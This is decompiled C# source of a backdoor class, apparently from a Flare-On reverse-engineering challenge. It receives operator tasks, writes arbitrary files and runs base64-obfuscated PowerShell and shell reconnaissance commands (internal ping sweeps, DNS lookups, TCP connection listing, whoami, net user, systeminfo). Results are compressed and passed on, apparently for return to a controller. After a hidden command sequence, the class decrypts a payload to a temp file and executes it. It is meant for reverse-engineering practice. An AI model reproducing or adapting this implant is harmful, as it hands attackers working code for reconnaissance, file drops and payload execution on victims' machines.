using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace FlareOn.Backdoor
{
	// Token: 0x02000023 RID: 35
	public class FLARE14
	{
		// Token: 0x0600008E RID: 142 RVA: 0x000049C4 File Offset: 0x0000B9C4
		public static uint flared_51(string s)
		{
			uint num = 0U;
			bool flag = s != null;
			if (flag)
			{
				num = 2166136261U;
				for (int i = 0; i < s.Length; i++)
				{
					num = ((uint)s[i] ^ num) * 16777619U;
				}
			}
			return num;
		}

		// Token: 0x0600008F RID: 143 RVA: 0x00004A14 File Offset: 0x0000BA14
		public static uint flare_51(string s)
		{
			uint result;
			try
			{
				result = FLARE14.flared_51(s);
			}
			catch (InvalidProgramException e)
			{
				result = (uint)FLARE15.flare_70(e, new object[]
				{
					s
				});
			}
			return result;
		}

		// Token: 0x06000090 RID: 144 RVA: 0x00004A58 File Offset: 0x0000BA58
		public static FLARE07 flare_52()
		{
			FLARE07 result;
			try
			{
				result = FLARE14.flared_56();
			}
			catch (InvalidProgramException e)
			{
				try
				{
					result = (FLARE07)FLARE15.flare_70(e, null);
				}
				catch (Exception ex)
				{
					result = FLARE07.B;
				}
			}
			return result;
		}

		// Token: 0x06000091 RID: 145 RVA: 0x00004AA4 File Offset: 0x0000BAA4
		public static void flared_52(object sender, NotifyCollectionChangedEventArgs e)
		{
			bool flag = e.Action == NotifyCollectionChangedAction.Remove;
			if (flag)
			{
				bool flag2 = FLARE14._bool && FLARE15.c.Count == 0;
				if (flag2)
				{
					FLARE14.flare_55();
				}
			}
		}

		// Token: 0x06000092 RID: 146 RVA: 0x00004AE4 File Offset: 0x0000BAE4
		public static void flare_53(object sender, NotifyCollectionChangedEventArgs f)
		{
			try
			{
				FLARE14.flared_52(sender, f);
			}
			catch (InvalidProgramException e)
			{
				FLARE15.flare_70(e, new object[]
				{
					sender,
					f
				});
			}
		}

		// Token: 0x06000093 RID: 147 RVA: 0x00004B28 File Offset: 0x0000BB28
		public static string flared_53(string s)
		{
			char[] array = s.ToCharArray();
			Array.Reverse(array);
			return new string(array);
		}

		// Token: 0x06000094 RID: 148 RVA: 0x00004B50 File Offset: 0x0000BB50
		public static string flare_54(string s)
		{
			string result;
			try
			{
				result = FLARE14.flared_53(s);
			}
			catch (InvalidProgramException e)
			{
				result = (string)FLARE15.flare_70(e, new object[]
				{
					s
				});
			}
			return result;
		}

		// Token: 0x06000095 RID: 149 RVA: 0x00004B94 File Offset: 0x0000BB94
		public static void flared_54()
		{
			byte[] d = FLARE15.flare_69(FLARE14.flare_54(FLARE14.sh));
			byte[] hashAndReset = FLARE14.h.GetHashAndReset();
			byte[] array = FLARE12.flare_46(hashAndReset, d);
			string text = Path.GetTempFileName() + Encoding.UTF8.GetString(FLARE12.flare_46(hashAndReset, new byte[]
			{
				31,
				29,
				40,
				72
			}));
			using (FileStream fileStream = new FileStream(text, FileMode.Create, FileAccess.Write, FileShare.Read))
			{
				fileStream.Write(array, 0, array.Length);
			}
			Process.Start(text);
		}

		// Token: 0x06000096 RID: 150 RVA: 0x00004C34 File Offset: 0x0000BC34
		public static void flare_55()
		{
			try
			{
				FLARE14.flared_54();
			}
			catch (InvalidProgramException e)
			{
				FLARE15.flare_70(e, null);
			}
		}

		// Token: 0x06000097 RID: 151 RVA: 0x00004C6C File Offset: 0x0000BC6C
		public static void flared_55(int i, string s)
		{
			bool flag = FLARE15.c.Count != 0 && FLARE15.c[0] == (i ^ 248);
			if (flag)
			{
				FLARE14.sh += s;
				FLARE15.c.Remove(i ^ 248);
			}
			else
			{
				FLARE14._bool = false;
			}
		}

		// Token: 0x06000098 RID: 152 RVA: 0x00004CD0 File Offset: 0x0000BCD0
		public static void flare_56(int i, string s)
		{
			try
			{
				FLARE14.flared_55(i, s);
			}
			catch (InvalidProgramException e)
			{
				FLARE15.flare_70(e, new object[]
				{
					i,
					s
				});
			}
		}

		// Token: 0x06000099 RID: 153 RVA: 0x00004D1C File Offset: 0x0000BD1C
		public static FLARE07 flared_56()
		{
			FLARE07 result = FLARE07.B;
			try
			{
				bool flag = FLARE14.ListData.Count > 0 && FLARE14.ListData[0] != null;
				if (flag)
				{
					byte[] array = FLARE14.ListData[0];
					FLARE06.TT taskType = (FLARE06.TT)array[0];
					byte[] array2 = array.Skip(1).ToArray<byte>();
					byte[] resultData = null;
					bool flag2 = taskType == FLARE06.TT.D || taskType == FLARE06.TT.E;
					if (flag2)
					{
						string s;
						try
						{
							bool flag3 = taskType == FLARE06.TT.E;
							if (flag3)
							{
								array2 = FLARE04.flare_19(array2);
							}
							int num = Array.IndexOf<byte>(array2, 124);
							File.WriteAllBytes(Encoding.UTF8.GetString(array2.Take(num).ToArray<byte>()), array2.Skip(num + 1).ToArray<byte>());
							s = ":)";
						}
						catch (Exception ex)
						{
							s = ex.Message;
						}
						resultData = Encoding.UTF8.GetBytes(s);
					}
					else
					{
						bool flag4 = taskType == FLARE06.TT.B;
						if (flag4)
						{
							array2 = FLARE04.flare_19(array2);
						}
						string cmd = Encoding.UTF8.GetString(array2);
						Thread thread = new Thread(delegate()
						{
							string text = cmd;
							bool flag9 = taskType == FLARE06.TT.C;
							if (flag9)
							{
								uint num2 = FLARE14.flare_51(text);
								bool flag10 = num2 <= 518729469U;
								if (flag10)
								{
									bool flag11 = num2 <= 434841374U;
									if (flag11)
									{
										bool flag12 = num2 <= 350953279U;
										if (flag12)
										{
											bool flag13 = num2 != 334175660U;
											if (flag13)
											{
												bool flag14 = num2 == 350953279U;
												if (flag14)
												{
													bool flag15 = text == "19";
													if (flag15)
													{
														FLARE14.flare_56(int.Parse(text), "146");
														text = FLARE02.flare_04("JChwaW5nIC1uIDEgMTAuNjUuNDUuMyB8IGZpbmRzdHIgL2kgdHRsKSAtZXEgJG51bGw7JChwaW5nIC1uIDEgMTAuNjUuNC41MiB8IGZpbmRzdHIgL2kgdHRsKSAtZXEgJG51bGw7JChwaW5nIC1uIDEgMTAuNjUuMzEuMTU1IHwgZmluZHN0ciAvaSB0dGwpIC1lcSAkbnVsbDskKHBpbmcgLW4gMSBmbGFyZS1vbi5jb20gfCBmaW5kc3RyIC9pIHR0bCkgLWVxICRudWxs");
														FLARE14.h.AppendData(Encoding.ASCII.GetBytes(FLARE14.flare_57() + text));
													}
												}
											}
											else
											{
												bool flag16 = text == "18";
												if (flag16)
												{
													FLARE14.flare_56(int.Parse(text), "939");
													text = FLARE02.flare_04("JAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4AMQAwAC4AMgAyAC4ANAAyACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwAOwAkACgAcABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAyADMALgAyADAAMAAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsADsAJAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4AMQAwAC4ANAA1AC4AMQA5ACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwAOwAkACgAcABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADkALgA1ADAAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAHQAdABsACkAIAAtAGUAcQAgACQAbgB1AGwAbAA=");
													FLARE14.h.AppendData(Encoding.ASCII.GetBytes(FLARE14.flare_57() + text));
												}
											}
										}
										else
										{
											bool flag17 = num2 != 401286136U;
											if (flag17)
											{
												bool flag18 = num2 != 418063755U;
												if (flag18)
												{
													bool flag19 = num2 == 434841374U;
													if (flag19)
													{
														bool flag20 = text == "16";
														if (flag20)
														{
															FLARE14.flare_56(int.Parse(text), "e87");
															text = FLARE02.flare_04("JAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4ANQAxAC4AMQAxACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwAOwAkACgAcABpAG4AZwAgAC0AbgAgADEAIAAxADAALgA2ADUALgA2AC4AMQAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsADsAJAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4ANQAyAC4AMgAwADAAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAHQAdABsACkAIAAtAGUAcQAgACQAbgB1AGwAbAA7ACQAKABwAGkAbgBnACAALQBuACAAMQAgADEAMAAuADYANQAuADYALgAzACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwA");
															FLARE14.h.AppendData(Encoding.ASCII.GetBytes(FLARE14.flare_57() + text));
														}
													}
												}
												else
												{
													bool flag21 = text == "15";
													if (flag21)
													{
														FLARE14.flare_56(int.Parse(text), "197");
														text = FLARE02.flare_04("JAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4AMQAwAC4AMQAwAC4ANAAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsADsAJAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4AMQAwAC4ANQAwAC4AMQAwACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwAOwAkACgAcABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAyADIALgA1ADAAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAHQAdABsACkAIAAtAGUAcQAgACQAbgB1AGwAbAA7ACQAKABwAGkAbgBnACAALQBuACAAMQAgADEAMAAuADEAMAAuADQANQAuADEAOQAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsAA==");
														FLARE14.h.AppendData(Encoding.ASCII.GetBytes(FLARE14.flare_57() + text));
													}
												}
											}
											else
											{
												bool flag22 = text == "14";
												if (flag22)
												{
													FLARE14.flare_56(int.Parse(text), "3a7");
													text = FLARE02.flare_04("JAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4AMQAwAC4AMgAxAC4AMgAwADEAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAHQAdABsACkAIAAtAGUAcQAgACQAbgB1AGwAbAA7ACQAKABwAGkAbgBnACAALQBuACAAMQAgADEAMAAuADEAMAAuADEAOQAuADIAMAAxACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwAOwAkACgAcABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADkALgAyADAAMgAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsADsAJAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4AMQAwAC4AMgA0AC4AMgAwADAAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAHQAdABsACkAIAAtAGUAcQAgACQAbgB1AGwAbAA=");
													FLARE14.h.AppendData(Encoding.ASCII.GetBytes(FLARE14.flare_57() + text));
												}
											}
										}
									}
									else
									{
										bool flag23 = num2 <= 468396612U;
										if (flag23)
										{
											bool flag24 = num2 != 451618993U;
											if (flag24)
											{
												bool flag25 = num2 == 468396612U;
												if (flag25)
												{
													bool flag26 = text == "10";
													if (flag26)
													{
														FLARE14.flare_56(int.Parse(text), "f38");
														text = "hostname";
														FLARE14.h.AppendData(Encoding.ASCII.GetBytes(FLARE14.flare_57() + text));
													}
												}
											}
											else
											{
												bool flag27 = text == "17";
												if (flag27)
												{
													FLARE14.flare_56(int.Parse(text), "2e4");
													text = FLARE02.flare_04("JAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4ANAA1AC4AMQA4ACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwAOwAkACgAcABpAG4AZwAgAC0AbgAgADEAIAAxADAALgA2ADUALgAyADgALgA0ADEAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAHQAdABsACkAIAAtAGUAcQAgACQAbgB1AGwAbAA7ACQAKABwAGkAbgBnACAALQBuACAAMQAgADEAMAAuADYANQAuADMANgAuADEAMwAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsADsAJAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4ANQAxAC4AMQAwACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwA");
													FLARE14.h.AppendData(Encoding.ASCII.GetBytes(FLARE14.flare_57() + text));
												}
											}
										}
										else
										{
											bool flag28 = num2 != 485174231U;
											if (flag28)
											{
												bool flag29 = num2 != 501951850U;
												if (flag29)
												{
													bool flag30 = num2 == 518729469U;
													if (flag30)
													{
														bool flag31 = text == "13";
														if (flag31)
														{
															FLARE14.flare_56(int.Parse(text), "e38");
															text = FLARE02.flare_04("bnNsb29rdXAgZmxhcmUtb24uY29tIHwgZmluZHN0ciAvaSBBZGRyZXNzO25zbG9va3VwIHdlYm1haWwuZmxhcmUtb24uY29tIHwgZmluZHN0ciAvaSBBZGRyZXNz");
															FLARE14.h.AppendData(Encoding.ASCII.GetBytes(FLARE14.flare_57() + text));
														}
													}
												}
												else
												{
													bool flag32 = text == "12";
													if (flag32)
													{
														FLARE14.flare_56(int.Parse(text), "570");
														text = FLARE02.flare_04("JAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4ANAAuADUAMAAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsADsAJAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4ANAAuADUAMQAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsADsAJAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4ANgA1AC4ANgA1ACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwAOwAkACgAcABpAG4AZwAgAC0AbgAgADEAIAAxADAALgA2ADUALgA1ADMALgA1ADMAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAHQAdABsACkAIAAtAGUAcQAgACQAbgB1AGwAbAA7ACQAKABwAGkAbgBnACAALQBuACAAMQAgADEAMAAuADYANQAuADIAMQAuADIAMAAwACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwA");
														FLARE14.h.AppendData(Encoding.ASCII.GetBytes(FLARE14.flare_57() + text));
													}
												}
											}
											else
											{
												bool flag33 = text == "11";
												if (flag33)
												{
													FLARE14.flare_56(int.Parse(text), "818");
													text = FLARE02.flare_04("RwBlAHQALQBOAGUAdABUAEMAUABDAG8AbgBuAGUAYwB0AGkAbwBuACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAkAF8ALgBTAHQAYQB0AGUAIAAtAGUAcQAgACIARQBzAHQAYQBiAGwAaQBzAGgAZQBkACIAfQAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAAIgBMAG8AYwBhAGwAQQBkAGQAcgBlAHMAcwAiACwAIAAiAEwAbwBjAGEAbABQAG8AcgB0ACIALAAgACIAUgBlAG0AbwB0AGUAQQBkAGQAcgBlAHMAcwAiACwAIAAiAFIAZQBtAG8AdABlAFAAbwByAHQAIgA=");
													FLARE14.h.AppendData(Encoding.ASCII.GetBytes(FLARE14.flare_57() + text));
												}
											}
										}
									}
								}
								else
								{
									bool flag34 = num2 <= 906799682U;
									if (flag34)
									{
										bool flag35 = num2 <= 822911587U;
										if (flag35)
										{
											bool flag36 = num2 != 806133968U;
											if (flag36)
											{
												bool flag37 = num2 == 822911587U;
												if (flag37)
												{
													bool flag38 = text == "4";
													if (flag38)
													{
														FLARE14.flare_56(int.Parse(text), "ea5");
														text = FLARE02.flare_04("WwBTAHkAcwB0AGUAbQAuAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBPAFMAVgBlAHIAcwBpAG8AbgAuAFYAZQByAHMAaQBvAG4AUwB0AHIAaQBuAGcA");
													}
												}
											}
											else
											{
												bool flag39 = text == "5";
												if (flag39)
												{
													FLARE14.flare_56(int.Parse(text), "bfb");
													text = "net user";
													FLARE14.h.AppendData(Encoding.ASCII.GetBytes(FLARE14.flare_57() + text));
												}
											}
										}
										else
										{
											bool flag40 = num2 != 839689206U;
											if (flag40)
											{
												bool flag41 = num2 != 873244444U;
												if (flag41)
												{
													bool flag42 = num2 == 906799682U;
													if (flag42)
													{
														bool flag43 = text == "3";
														if (flag43)
														{
															FLARE14.flare_56(int.Parse(text), "113");
															text = "whoami";
															FLARE14.h.AppendData(Encoding.ASCII.GetBytes(FLARE14.flare_57() + text));
														}
													}
												}
												else
												{
													bool flag44 = text == "1";
													if (flag44)
													{
														FLARE14.flare_56(int.Parse(text), "c2e");
														text = FLARE02.flare_04("RwBlAHQALQBOAGUAdABJAFAAQQBkAGQAcgBlAHMAcwAgAC0AQQBkAGQAcgBlAHMAcwBGAGEAbQBpAGwAeQAgAEkAUAB2ADQAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAEkAUABBAGQAZAByAGUAcwBzAA==");
														FLARE14.h.AppendData(Encoding.ASCII.GetBytes(FLARE14.flare_57() + text));
													}
												}
											}
											else
											{
												bool flag45 = text == "7";
												if (flag45)
												{
													FLARE14.flare_56(int.Parse(text), "b");
													text = FLARE02.flare_04("RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwAiACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIABOAGEAbQBlAA==");
													FLARE14.h.AppendData(Encoding.ASCII.GetBytes(FLARE14.flare_57() + text));
												}
											}
										}
									}
									else
									{
										bool flag46 = num2 <= 1024243015U;
										if (flag46)
										{
											bool flag47 = num2 != 923577301U;
											if (flag47)
											{
												bool flag48 = num2 != 1007465396U;
												if (flag48)
												{
													bool flag49 = num2 == 1024243015U;
													if (flag49)
													{
														bool flag50 = text == "8";
														if (flag50)
														{
															FLARE14.flare_56(int.Parse(text), "2b7");
															text = FLARE02.flare_04("RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgACcAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwAgACgAeAA4ADYAKQAnACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIABOAGEAbQBlAA==");
															FLARE14.h.AppendData(Encoding.ASCII.GetBytes(FLARE14.flare_57() + text));
														}
													}
												}
												else
												{
													bool flag51 = text == "9";
													if (flag51)
													{
														FLARE14.flare_56(int.Parse(text), "9b2");
														text = FLARE02.flare_04("RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgACcAQwA6ACcAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAE4AYQBtAGUA");
														FLARE14.h.AppendData(Encoding.ASCII.GetBytes(FLARE14.flare_57() + text));
													}
												}
											}
											else
											{
												bool flag52 = text == "2";
												if (flag52)
												{
													FLARE14.flare_56(int.Parse(text), "d7d");
													text = FLARE02.flare_04("RwBlAHQALQBOAGUAdABOAGUAaQBnAGgAYgBvAHIAIAAtAEEAZABkAHIAZQBzAHMARgBhAG0AaQBsAHkAIABJAFAAdgA0ACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIAAiAEkAUABBAEQARAByAGUAcwBzACIA");
													FLARE14.h.AppendData(Encoding.ASCII.GetBytes(FLARE14.flare_57() + text));
												}
											}
										}
										else
										{
											bool flag53 = num2 != 2364708844U;
											if (flag53)
											{
												bool flag54 = num2 != 2381486463U;
												if (flag54)
												{
													bool flag55 = num2 == 2415041701U;
													if (flag55)
													{
														bool flag56 = text == "22";
														if (flag56)
														{
															FLARE14.flare_56(int.Parse(text), "709");
															text = "systeminfo | findstr /i \"Domain\"";
															FLARE14.h.AppendData(Encoding.ASCII.GetBytes(FLARE14.flare_57() + text));
														}
													}
												}
												else
												{
													bool flag57 = text == "20";
													if (flag57)
													{
														FLARE14.flare_56(int.Parse(text), "3c9974");
														text = FLARE02.flare_04("RwBlAHQALQBOAGUAdABJAFAAQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgAgAHwAIABGAG8AcgBlAGEAYwBoACAASQBQAHYANABEAGUAZgBhAHUAbAB0AEcAYQB0AGUAdwBhAHkAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAE4AZQB4AHQASABvAHAA");
														FLARE14.h.AppendData(Encoding.ASCII.GetBytes(FLARE14.flare_57() + text));
													}
												}
											}
											else
											{
												bool flag58 = text == "21";
												if (flag58)
												{
													FLARE14.flare_56(int.Parse(text), "8e6");
													text = FLARE02.flare_04("RwBlAHQALQBEAG4AcwBDAGwAaQBlAG4AdABTAGUAcgB2AGUAcgBBAGQAZAByAGUAcwBzACAALQBBAGQAZAByAGUAcwBzAEYAYQBtAGkAbAB5ACAASQBQAHYANAAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAAUwBFAFIAVgBFAFIAQQBkAGQAcgBlAHMAcwBlAHMA");
													FLARE14.h.AppendData(Encoding.ASCII.GetBytes(FLARE14.flare_57() + text));
												}
											}
										}
									}
								}
							}
							string s2 = FLARE02.flare_06(FLARE02.flare_03(text));
							resultData = Encoding.UTF8.GetBytes(s2);
						});
						thread.Start();
						bool flag5 = !thread.Join(FLARE03.task_timeout);
						if (flag5)
						{
							thread.Abort();
							resultData = Encoding.UTF8.GetBytes("timeout");
						}
					}
					bool flag6 = resultData != null;
					if (flag6)
					{
						byte[] array3 = FLARE04.flare_18(resultData);
						bool flag7 = array3.Length < resultData.Length;
						if (flag7)
						{
							resultData = new byte[]
							{
								61
							}.Concat(array3).ToArray<byte>();
						}
						else
						{
							resultData = new byte[]
							{
								57
							}.Concat(resultData).ToArray<byte>();
						}
					}
					byte[] array4 = new byte[(resultData == null) ? 0 : resultData.Length];
					bool flag8 = resultData != null;
					if (flag8)
					{
						Array.Copy(resultData, 0, array4, 0, resultData.Length);
					}
					FLARE14.ListData.RemoveAt(0);
					result = FLARE07.E;
					FLARE05.flare_28(array4);
				}
			}
			catch (Exception ex2)
			{
				result = FLARE07.B;
			}
			return result;
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00004FDC File Offset: 0x0000BFDC
		public static string flared_57()
		{
			StackTrace stackTrace = new StackTrace();
			return stackTrace.GetFrame(1).GetMethod().ToString() + stackTrace.GetFrame(2).GetMethod().ToString();
		}

		// Token: 0x0600009B RID: 155 RVA: 0x0000501C File Offset: 0x0000C01C
		public static string flare_57()
		{
			string result;
			try
			{
				result = FLARE14.flared_57();
			}
			catch (InvalidProgramException e)
			{
				result = (string)FLARE15.flare_70(e, null);
			}
			return result;
		}

		// Token: 0x04000127 RID: 295
		public static IncrementalHash h = null;

		// Token: 0x04000128 RID: 296
		public static string sh = "";

		// Token: 0x04000129 RID: 297
		public static bool _bool = true;

		// Token: 0x0400012A RID: 298
		public static List<byte[]> ListData;
	}
}
